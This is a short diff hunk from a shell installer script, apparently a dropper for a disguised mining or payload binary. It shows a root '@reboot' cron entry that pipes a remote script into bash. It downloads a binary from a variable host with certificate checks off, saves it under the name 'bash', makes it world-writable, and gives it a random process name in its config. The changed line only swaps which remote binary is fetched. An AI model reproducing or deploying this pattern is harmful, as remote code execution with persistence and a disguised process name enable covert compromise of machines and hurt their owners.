@@ -35,7 +35,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/q.sh |bash >/dev/null
 
 rm -rf "${work}"; mkdir -p "${work}"
 wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
+wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q213"
 chmod -R 777 "${work}"
 sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"
 [ -n "$idlePid" ] && sed -i "s/\"idleSettings\":.*/\"idleSettings\": {\"command\": \"kill\", \"arguments\": \"-10 $idlePid\"},/" "${work}/appsettings.json"
